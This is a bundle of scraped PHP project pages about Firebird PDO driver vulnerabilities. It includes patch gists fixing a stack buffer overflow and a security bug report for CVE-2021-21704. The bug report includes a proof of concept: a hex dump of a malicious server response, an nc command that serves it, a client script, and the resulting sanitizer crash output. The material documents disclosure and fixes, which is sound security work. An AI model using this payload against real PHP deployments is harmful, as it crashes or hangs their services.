[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=40&u=7ec59f5ef95aa5b3f78fa7c0556425e44feb97e9&v=4)](/cmb69)
[cmb69](/cmb69)
mentioned this pull request
[May 6, 2021](#ref-pullrequest-877349518)

[Add simple Firebird payload fake server to test suite
#6947](/php/php-src/pull/6947)
 Closed

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=40&u=7ec59f5ef95aa5b3f78fa7c0556425e44feb97e9&v=4)](/cmb69)
[cmb69](/cmb69)
closed this
in
`[f95f8a3](/php/php-src/commit/f95f8a3c1ec37bedc8888146f15b5660415574de)`
[May 6, 2021](#event-4694984586)

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=80&u=7ec59f5ef95aa5b3f78fa7c0556425e44feb97e9&v=4)](/cmb69)

Copy link

Member

Author

### **[cmb69](/cmb69)** commented [May 6, 2021](#issuecomment-833497444)

| CI was fine for PR [#6947](https://github.com/php/php-src/pull/6947). |
| --- |

All reactions

Sorry, something went wrong.

 [![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=40&u=7ec59f5ef95aa5b3f78fa7c0556425e44feb97e9&v=4)](/cmb69)
[cmb69](/cmb69)
deleted the
cmb/fb-payload-server

branch
[May 6, 2021 12:52](#event-4694990421)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fpull%2F6940)

Reviewers

[![@nikic](https://avatars.githubusercontent.com/u/216080?s=40&v=4)](/nikic) [nikic](/nikic)

nikic approved these changes

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

3 participants

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=52&v=4)](/cmb69) [![@smalyshev](https://avatars.githubusercontent.com/u/155000?s=52&v=4)](/smalyshev) [![@nikic](https://avatars.githubusercontent.com/u/216080?s=52&v=4)](/nikic)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from people.php.net_5e3d1783_20250115_133642.html ===


[![php](//php.net/images/logo.php?people)people](/)

* [Manage](https://main.php.net/manage/users.php)
* [Help](https://wiki.php.net/web/people)

# Stanislav Malyshev

## stas

![Picture of Stanislav Malyshev](//www.gravatar.com/avatar/2abfb1613a54da98d2ad76907550d6eb.jpg?s=460)

* stas@php.net
* [0 open bugs assigned](https://bugs.php.net/search.php?cmd=display&order_by=ts2&direction=DESC&status=Open&assign=stas)
* [edit on main](https://main.php.net/manage/users.php?username=stas)

﻿

* [Copyright © 2001-2025 The PHP Group](//php.net/copyright)
* [Other PHP.net sites](//php.net/sites)
* [Privacy policy](//php.net/privacy)



=== Content from gist.github.com_dc562187_20250115_133643.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2Fcf5e3162c68cb999da4572e2ab72d5dc)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2Fcf5e3162c68cb999da4572e2ab72d5dc&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2Fcf5e3162c68cb999da4572e2ab72d5dc) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2Fcf5e3162c68cb999da4572e2ab72d5dc&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=64&v=4)](/cmb69)

# [cmb69](/cmb69)/**[0001-Fix-76448-Stack-buffer-overflow-in-firebird\_info\_cb.patch](/cmb69/cf5e3162c68cb999da4572e2ab72d5dc)** Secret

Last active
April 29, 2021 13:27

Show Gist options

* [Download ZIP](/cmb69/cf5e3162c68cb999da4572e2ab72d5dc/archive/34d16cb986ced253e10d86aad17fce00f8a8fe83.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2Fcf5e3162c68cb999da4572e2ab72d5dc)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2Fcf5e3162c68cb999da4572e2ab72d5dc)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/cmb69/cf5e3162c68cb999da4572e2ab72d5dc.js&quot;&gt;&lt;/script&gt;
* Save cmb69/cf5e3162c68cb999da4572e2ab72d5dc to your computer and use it in GitHub Desktop.

[Code](/cmb69/cf5e3162c68cb999da4572e2ab72d5dc)
[Revisions
2](/cmb69/cf5e3162c68cb999da4572e2ab72d5dc/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/cmb69/cf5e3162c68cb999da4572e2ab72d5dc.js&quot;&gt;&lt;/script&gt;

Save cmb69/cf5e3162c68cb999da4572e2ab72d5dc to your computer and use it in GitHub Desktop.

[Download ZIP](/cmb69/cf5e3162c68cb999da4572e2ab72d5dc/archive/34d16cb986ced253e10d86aad17fce00f8a8fe83.zip)

Fix for PHP bug #76448

 [Raw](/cmb69/cf5e3162c68cb999da4572e2ab72d5dc/raw/34d16cb986ced253e10d86aad17fce00f8a8fe83/0001-Fix-76448-Stack-buffer-overflow-in-firebird_info_cb.patch)

[**0001-Fix-76448-Stack-buffer-overflow-in-firebird\_info\_cb.patch**](#file-0001-fix-76448-stack-buffer-overflow-in-firebird_info_cb-patch)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | From 1d504a7cb60294b2822809bc16d5447ef16ea38f Mon Sep 17 00:00:00 2001 |
| --- | --- |
|  | From: "Christoph M. Becker" <cmbecker69@gmx.de> |
|  | Date: Thu, 29 Apr 2021 15:26:22 +0200 |
|  | Subject: [PATCH] Fix #76448: Stack buffer overflow in firebird\_info\_cb |
|  |  |
|  | We ensure not to overflow the stack allocated buffer by using `strlcat`. |
|  | --- |
|  | ext/pdo\_firebird/firebird\_driver.c | 8 +++++--- |
|  | ext/pdo\_firebird/tests/bug\_76448.phpt | 12 ++++++++++++ |
|  | 2 files changed, 17 insertions(+), 3 deletions(-) |
|  | create mode 100644 ext/pdo\_firebird/tests/bug\_76448.phpt |
|  |  |
|  | diff --git a/ext/pdo\_firebird/firebird\_driver.c b/ext/pdo\_firebird/firebird\_driver.c |
|  | index b1869f2695..125e6b101c 100644 |
|  | --- a/ext/pdo\_firebird/firebird\_driver.c |
|  | +++ b/ext/pdo\_firebird/firebird\_driver.c |
|  | @@ -509,14 +509,16 @@ static int firebird\_handle\_set\_attribute(pdo\_dbh\_t \*dbh, zend\_long attr, zval \*v |
|  | } |
|  | /\* }}} \*/ |
|  |  |
|  | +#define INFO\_BUF\_LEN 512 |
|  | + |
|  | /\* callback to used to report database server info \*/ |
|  | static void firebird\_info\_cb(void \*arg, char const \*s) /\* {{{ \*/ |
|  | { |
|  | if (arg) { |
|  | if (\*(char\*)arg) { /\* second call \*/ |
|  | - strcat(arg, " "); |
|  | + strlcat(arg, " ", INFO\_BUF\_LEN); |
|  | } |
|  | - strcat(arg, s); |
|  | + strlcat(arg, s, INFO\_BUF\_LEN); |
|  | } |
|  | } |
|  | /\* }}} \*/ |
|  | @@ -527,7 +529,7 @@ static int firebird\_handle\_get\_attribute(pdo\_dbh\_t \*dbh, zend\_long attr, zval \*v |
|  | pdo\_firebird\_db\_handle \*H = (pdo\_firebird\_db\_handle \*)dbh->driver\_data; |
|  |  |
|  | switch (attr) { |
|  | - char tmp[512]; |
|  | + char tmp[INFO\_BUF\_LEN]; |
|  |  |
|  | case PDO\_ATTR\_AUTOCOMMIT: |
|  | ZVAL\_LONG(val,dbh->auto\_commit); |
|  | diff --git a/ext/pdo\_firebird/tests/bug\_76448.phpt b/ext/pdo\_firebird/tests/bug\_76448.phpt |
|  | new file mode 100644 |
|  | index 0000000000..955ff9b1c7 |
|  | --- /dev/null |
|  | +++ b/ext/pdo\_firebird/tests/bug\_76448.phpt |
|  | @@ -0,0 +1,12 @@ |
|  | +--TEST-- |
|  | +Bug #76448 (Stack buffer overflow in firebird\_info\_cb) |
|  | +--SKIPIF-- |
|  | +<?php require('skipif.inc'); ?> |
|  | +--FILE-- |
|  | +<?php |
|  | +require 'testdb.inc'; |
|  | + |
|  | +var\_dump(strlen($dbh->getAttribute(PDO::ATTR\_SERVER\_INFO)) < 512); |
|  | +?> |
|  | +--EXPECT-- |
|  | +bool(true) |
|  | -- |
|  | 2.31.1.windows.1 |
|  |  |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2Fcf5e3162c68cb999da4572e2ab72d5dc)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from bugs.php.net_9c3a182d_20250115_090358.html ===


| [Bugs](/) | [php.net](https://php.net/) |  [support](https://php.net/support.php) |  [documentation](https://php.net/docs.php) |  [report a bug](report.php) |  [advanced search](search.php) |  [search howto](search-howto.php) |  [statistics](stats.php) |  [random bug](random) |  [login](login.php) |
| --- | --- |
| go to bug id or search bugs for | |

| | [Sec Bug](bug.php?id=76449) #76449 | SIGSEGV in firebird\_handle\_doer | | | | | | --- | --- | --- | --- | --- | --- | | Submitted: | 2018-06-11 19:50 UTC | Modified: | 2021-06-28 04:40 UTC |  | | From: | trichimtrich at gmail dot com | Assigned: | [stas](search.php?cmd=display&assign=stas) ([profile](https://people.php.net/stas)) | | Status: | Closed | Package: | [PDO Firebird](search.php?cmd=display&package_name[]=PDO+Firebird) | | PHP Version: | 7.3.0alpha1 | OS: |  | | Private report: | No | CVE-ID: | [2021-21704](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21704) |   View [Developer](bug.php?id=76449&edit=1) [Edit](bug.php?id=76449&edit=2)   **[2018-06-11 19:50 UTC] trichimtrich at gmail dot com** ``` Description: ------------ A bug in pdo_firebase module allows a malicious firebase server or man-in-the-middle attacker to crash PHP.  firebird_handle_doer uses response from server without verify the data, and uses wrong type to cast length, leads to crash and hang PHP.  Vulnerable code in: \php-src\ext\pdo_firebird\firebird_driver.c:   134  				if (result[0] == isc_info_sql_records) {   135: 					unsigned i = 3, result_size = isc_vax_integer(&result[1], 2);   136  					while (result[i] != isc_info_end && i < result_size) {   137: 						short len = (short) isc_vax_integer(&result[i + 1], 2);   138  						if (result[i] != isc_info_req_select_count) {   139: 							affected_rows += isc_vax_integer(&result[i + 3], len);   140  						}   141  						i += len + 3;  result_size is not verified len uses short type, that we can set len = -3 and make PHP hangs forever.   $ ./php --version PHP 7.3.0-dev (cli) (built: Jun  9 2018 04:47:18) ( NTS ) Copyright (c) 1997-2018 The PHP Group Zend Engine v3.3.0-dev, Copyright (c) 1998-2018 Zend Technologies  Test script: --------------- $ xxd exec_insert.bin 00000000: 0000 005e ffff 800f 0000 0001 0000 0005  ...^............ 00000010: 0000 0000 0000 000b 4c65 6761 6379 5f41  ........Legacy_A 00000020: 7574 6800 0000 0000 0000 0000 0000 005c  uth............\ 00000030: 0000 0000 0000 000b 4c65 6761 6379 5f41  ........Legacy_A 00000040: 7574 6800 0000 0000 0000 0000 0000 0009  uth............. 00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 00000060: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 00000070: 0000 0001 0000 0000 0000 0000 0000 0000  ................ 00000080: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 00000090: 0000 0002 0000 0000 0000 0000 0000 0000  ................ 000000a0: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 000000b0: 0000 0000 0000 0000 0000 0000 0000 001f  ................ 000000c0: 1504 0002 0000 001b 0400 0200 0000 0507  ................ 000000d0: 0400 0000 0000 0407 0400 0000 0000 0100  ................ 000000e0: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 000000f0: 0000 0001 0000 0000 0000 0000 0000 0000  ................ 00000100: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 00000110: 0000 0002 0000 0000 0000 0000 0000 0021  ...............! 00000120: 17ff ff0f feff 1000 0000 1004 0000 0000  ................ 00000130: 000d 0400 0000 0000 0e04 0001 0000 0002  ................ 00000140: 0100 0000 0000 0001 0000 0000 0000 0000  ................ 00000150: 0000 0009 0000 0000 0000 0000 0000 0000  ................ 00000160: 0000 0000 0000 0001 0000 0000 0000 0000  ................ 00000170: 0000 0009 ffff ffff 0000 0000 0000 0000  ................ 00000180: 0000 0000 0000 0001 0000 0000 0000 0000  ................ 00000190: 0000 0009 0000 0000 0000 0000 0000 0000  ................ 000001a0: 0000 0000 0000 0001 0000 0000 0000 0000  ................ 000001b0: 0000 0009 0000 0000 0000 0000 0000 0000  ................ 000001c0: 0000 0000 0000 0001 0000 0000 0000 0000  ................   $ nc -lvp 3050 < exec_insert.bin  $ cat fire_exec.php <?php $dsn = 'firebird:dbname=localhost:employee;charset=utf8;'; $username = 'SYSDBA'; $password = 'masterkey';  $dbh = new PDO($dsn, $username, $password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]); echo $dbh->exec("INSERT INTO test VALUES ('hihi2', 'xxxxx')"); ?>  Expected result: ---------------- No crash No hang  Actual result: -------------- $ ./php fire_exec.php ASAN:DEADLYSIGNAL ================================================================= ==5319==ERROR: AddressSanitizer: stack-overflow on address 0x7fffd615faa1 (pc 0x000000cd9655 bp 0x7fffd6157590 sp 0x7fffd6157240 T0)     #0 0xcd9654 in firebird_handle_doer (/mnt/hgfs/share/htdocs/php+0xcd9654)     #1 0xcbd411 in zim_PDO_exec (/mnt/hgfs/share/htdocs/php+0xcbd411)     #2 0x12e2d9f in ZEND_DO_FCALL_SPEC_RETVAL_USED_HANDLER (/mnt/hgfs/share/htdocs/php+0x12e2d9f)     #3 0x1212bcf in execute_ex (/mnt/hgfs/share/htdocs/php+0x1212bcf)     #4 0x121320b in zend_execute (/mnt/hgfs/share/htdocs/php+0x121320b)     #5 0x11175c0 in zend_execute_scripts (/mnt/hgfs/share/htdocs/php+0x11175c0)     #6 0xfa4878 in php_execute_script (/mnt/hgfs/share/htdocs/php+0xfa4878)     #7 0x1412cc4 in do_cli (/mnt/hgfs/share/htdocs/php+0x1412cc4)     #8 0x1410e67 in main (/mnt/hgfs/share/htdocs/php+0x1410e67)     #9 0x7f6c837b782f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)     #10 0x43d878 in _start (/mnt/hgfs/share/htdocs/php+0x43d878)  SUMMARY: AddressSanitizer: stack-overflow (/mnt/hgfs/share/htdocs/php+0xcd9654) in firebird_handle_doer ==5319==ABORTING   ``` PatchesPull RequestsHistoryAllCommentsChangesGit/SVN commitsRelated reports  **[2018-06-11 20:06 UTC] [stas@php.net](//people.php.net/stas)** -Assigned To: +Assigned To: lwe **[2018-06-11 21:18 UTC] trichimtrich at gmail dot com** ``` PoC hangs PHP  $ xxd exec_insert.bin 00000000: 0000 005e ffff 800f 0000 0001 0000 0005  ...^............ 00000010: 0000 0000 0000 000b 4c65 6761 6379 5f41  ........Legacy_A 00000020: 7574 6800 0000 0000 0000 0000 0000 005c  uth............\ 00000030: 0000 0000 0000 000b 4c65 6761 6379 5f41  ........Legacy_A 00000040: 7574 6800 0000 0000 0000 0000 0000 0009  uth............. 00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 00000060: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 00000070: 0000 0001 0000 0000 0000 0000 0000 0000  ................ 00000080: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 00000090: 0000 0002 0000 0000 0000 0000 0000 0000  ................ 000000a0: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 000000b0: 0000 0000 0000 0000 0000 0000 0000 001f  ................ 000000c0: 1504 0002 0000 001b 0400 0200 0000 0507  ................ 000000d0: 0400 0000 0000 0407 0400 0000 0000 0100  ................ 000000e0: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 000000f0: 0000 0001 0000 0000 0000 0000 0000 0000  ................ 00000100: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 00000110: 0000 0002 0000 0000 0000 0000 0000 0021  ...............! 00000120: 17ff ff0f fdff 1000 0000 1004 0000 0000  ................ 00000130: 000d 0400 0000 0000 0e04 0001 0000 0002  ................ 00000140: 0100 0000 0000 0001 0000 0000 0000 0000  ................ 00000150: 0000 0009 0000 0000 0000 0000 0000 0000  ................ 00000160: 0000 0000 0000 0001 0000 0000 0000 0000  ................ 00000170: 0000 0009 ffff ffff 0000 0000 0000 0000  ................ 00000180: 0000 0000 0000 0001 0000 0000 0000 0000  ................ 00000190: 0000 0009 0000 0000 0000 0000 0000 0000  ................ 000001a0: 0000 0000 0000 0001 0000 0000 0000 0000  ................ 000001b0: 0000 0009 0000 0000 0000 0000 0000 0000  ................ 000001c0: 0000 0000 0000 0001 0000 0000 0000 0000  ................  ``` **[2018-06-28 08:31 UTC] trichimtrich at gmail dot com** ``` any update for this one?  ``` **[2021-04-30 11:54 UTC] [cmb@php.net](//people.php.net/cmb)** -Status: Assigned +Status: Verified -Assigned To: lwe +Assigned To: cmb **[2021-05-05 12:15 UTC] [cmb@php.net](//people.php.net/cmb)** -Assigned To: cmb +Assigned To: stas **[2021-05-05 12:15 UTC] [cmb@php.net](//people.php.net/cmb)** ``` Suggested patch: <<https://gist.github.com/cmb69/344574cbdbfa305a329c0e18a752d31d>>.  This requires the payload server[1], and is developed against PHP-7.4.  For PHP-7.3 at least some adjustments need to be done. I can do that, but first would like to confirm that the patch and the testing "framework" are generally acceptable.  Stas, what do you think?  [1] <<https://github.com/php/php-src/pull/6940>>  ``` **[2021-06-21 05:11 UTC] [stas@php.net](//people.php.net/stas)** -CVE-ID: +CVE-ID: 2021-21704 **[2021-06-21 06:22 UTC] [stas@php.net](//people.php.net/stas)** -Private report: No +Private report: Yes **[2021-06-28 04:41 UTC] [git@php.net](//people.php.net/git)** ``` Automatic comment on behalf of cmb69 (author) and smalyshev (committer) Revision: <https://github.com/php/php-src/commit/08da7c73726f7b86b67d6f0ff87c73c585a7834a> Log: Fix #76449: SIGSEGV in firebird_handle_doer  ``` **[2021-06-28 04:41 UTC] [git@php.net](//people.php.net/git)** -Status: Verified +Status: Closed |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

|  | |
| --- | --- |
| [PHP](https://php.net/) [Copyright © 2001-2025 The PHP Group](https://php.net/copyright.php) All rights reserved. | Last updated: Wed Jan 15 09:01:28 2025 UTC |



=== Content from gist.github.com_016dee43_20250115_133637.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F51a5818efda86f39a5afdd93caf31e8e)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F51a5818efda86f39a5afdd93caf31e8e&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F51a5818efda86f39a5afdd93caf31e8e) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F51a5818efda86f39a5afdd93caf31e8e&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=64&v=4)](/cmb69)

# [cmb69](/cmb69)/**[0001-Fix-76448-Stack-buffer-overflow-in-firebird\_info\_cb.patch](/cmb69/51a5818efda86f39a5afdd93caf31e8e)** Secret

Created
May 5, 2021 11:46

Show Gist options

* [Download ZIP](/cmb69/51a5818efda86f39a5afdd93caf31e8e/archive/6343f2eea77efa8cd6a003d5a91d9465a0622121.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F51a5818efda86f39a5afdd93caf31e8e)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F51a5818efda86f39a5afdd93caf31e8e)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/cmb69/51a5818efda86f39a5afdd93caf31e8e.js&quot;&gt;&lt;/script&gt;
* Save cmb69/51a5818efda86f39a5afdd93caf31e8e to your computer and use it in GitHub Desktop.

[Code](/cmb69/51a5818efda86f39a5afdd93caf31e8e)
[Revisions
1](/cmb69/51a5818efda86f39a5afdd93caf31e8e/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/cmb69/51a5818efda86f39a5afdd93caf31e8e.js&quot;&gt;&lt;/script&gt;

Save cmb69/51a5818efda86f39a5afdd93caf31e8e to your computer and use it in GitHub Desktop.

[Download ZIP](/cmb69/51a5818efda86f39a5afdd93caf31e8e/archive/6343f2eea77efa8cd6a003d5a91d9465a0622121.zip)

Fix for PHP bug #76448

 [Raw](/cmb69/51a5818efda86f39a5afdd93caf31e8e/raw/6343f2eea77efa8cd6a003d5a91d9465a0622121/0001-Fix-76448-Stack-buffer-overflow-in-firebird_info_cb.patch)

[**0001-Fix-76448-Stack-buffer-overflow-in-firebird\_info\_cb.patch**](#file-0001-fix-76448-stack-buffer-overflow-in-firebird_info_cb-patch)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | From 8e1752c17244c7b3012b20966a764be3fd60b72b Mon Sep 17 00:00:00 2001 |
| --- | --- |
|  | From: "Christoph M. Becker" <cmbecker69@gmx.de> |
|  | Date: Thu, 29 Apr 2021 15:26:22 +0200 |
|  | Subject: [PATCH] Fix #76448: Stack buffer overflow in firebird\_info\_cb |
|  |  |
|  | We ensure not to overflow the stack allocated buffer by using `strlcat`. |
|  | --- |
|  | ext/pdo\_firebird/firebird\_driver.c | 8 +++++--- |
|  | ext/pdo\_firebird/tests/bug\_76448.data | Bin 0 -> 749 bytes |
|  | ext/pdo\_firebird/tests/bug\_76448.phpt | 23 +++++++++++++++++++++++ |
|  | 3 files changed, 28 insertions(+), 3 deletions(-) |
|  | create mode 100644 ext/pdo\_firebird/tests/bug\_76448.data |
|  | create mode 100644 ext/pdo\_firebird/tests/bug\_76448.phpt |
|  |  |
|  | diff --git a/ext/pdo\_firebird/firebird\_driver.c b/ext/pdo\_firebird/firebird\_driver.c |
|  | index b1869f2695..125e6b101c 100644 |
|  | --- a/ext/pdo\_firebird/firebird\_driver.c |
|  | +++ b/ext/pdo\_firebird/firebird\_driver.c |
|  | @@ -509,14 +509,16 @@ static int firebird\_handle\_set\_attribute(pdo\_dbh\_t \*dbh, zend\_long attr, zval \*v |
|  | } |
|  | /\* }}} \*/ |
|  |  |
|  | +#define INFO\_BUF\_LEN 512 |
|  | + |
|  | /\* callback to used to report database server info \*/ |
|  | static void firebird\_info\_cb(void \*arg, char const \*s) /\* {{{ \*/ |
|  | { |
|  | if (arg) { |
|  | if (\*(char\*)arg) { /\* second call \*/ |
|  | - strcat(arg, " "); |
|  | + strlcat(arg, " ", INFO\_BUF\_LEN); |
|  | } |
|  | - strcat(arg, s); |
|  | + strlcat(arg, s, INFO\_BUF\_LEN); |
|  | } |
|  | } |
|  | /\* }}} \*/ |
|  | @@ -527,7 +529,7 @@ static int firebird\_handle\_get\_attribute(pdo\_dbh\_t \*dbh, zend\_long attr, zval \*v |
|  | pdo\_firebird\_db\_handle \*H = (pdo\_firebird\_db\_handle \*)dbh->driver\_data; |
|  |  |
|  | switch (attr) { |
|  | - char tmp[512]; |
|  | + char tmp[INFO\_BUF\_LEN]; |
|  |  |
|  | case PDO\_ATTR\_AUTOCOMMIT: |
|  | ZVAL\_LONG(val,dbh->auto\_commit); |
|  | diff --git a/ext/pdo\_firebird/tests/bug\_76448.data b/ext/pdo\_firebird/tests/bug\_76448.data |
|  | new file mode 100644 |
|  | index 0000000000000000000000000000000000000000..e391bd874e94e8814617b3531b3d799735d1568f |
|  | GIT binary patch |
|  | literal 749 |
|  | zcmZQzV2Jzwzk#2Dfq@Z-S%DY?xP4O76O$|B9ZO3xAR-Vl2Fk%D&xx!U$\_AMW18DM$ |
|  | z3`{VYkxSzXABS`mMkb|jPu&m`Jp&-Lw6sug%PdMw$}CDz017EM<`iTkDj5DJtVBO? |
|  | f7z1ur1|}Cq7nUMk1}0E=GJ;bx3nMse;Q<T)!=QC1 |
|  |  |
|  | literal 0 |
|  | HcmV?d00001 |
|  |  |
|  | diff --git a/ext/pdo\_firebird/tests/bug\_76448.phpt b/ext/pdo\_firebird/tests/bug\_76448.phpt |
|  | new file mode 100644 |
|  | index 0000000000..d13bab5ba1 |
|  | --- /dev/null |
|  | +++ b/ext/pdo\_firebird/tests/bug\_76448.phpt |
|  | @@ -0,0 +1,23 @@ |
|  | +--TEST-- |
|  | +Bug #76448 (Stack buffer overflow in firebird\_info\_cb) |
|  | +--SKIPIF-- |
|  | +<?php |
|  | +if (!extension\_loaded('pdo\_firebird')) die("skip podo\_firebird extension not available"); |
|  | +if (!extension\_loaded('sockets')) die("skip sockets extension not available"); |
|  | +?> |
|  | +--FILE-- |
|  | +<?php |
|  | +require\_once "payload\_server.inc"; |
|  | + |
|  | +$address = run\_server(\_\_DIR\_\_ . "/bug\_76448.data"); |
|  | + |
|  | +// no need to change the credentials; we're running against a falke server |
|  | +$dsn = "firebird:dbname=inet://$address/test"; |
|  | +$username = 'SYSDBA'; |
|  | +$password = 'masterkey'; |
|  | + |
|  | +$dbh = new PDO($dsn, $username, $password, [PDO::ATTR\_ERRMODE => PDO::ERRMODE\_EXCEPTION]); |
|  | +var\_dump($dbh->getAttribute(PDO::ATTR\_SERVER\_INFO)); |
|  | +?> |
|  | +--EXPECT-- |
|  | +bool(false) |
|  | -- |
|  | 2.31.1.windows.1 |
|  |  |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F51a5818efda86f39a5afdd93caf31e8e)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from bugs.php.net_d0e17860_20250115_090357.html ===


| [Bugs](/) | [php.net](https://php.net/) |  [support](https://php.net/support.php) |  [documentation](https://php.net/docs.php) |  [report a bug](report.php) |  [advanced search](search.php) |  [search howto](search-howto.php) |  [statistics](stats.php) |  [random bug](random) |  [login](login.php) |
| --- | --- |
| go to bug id or search bugs for | |

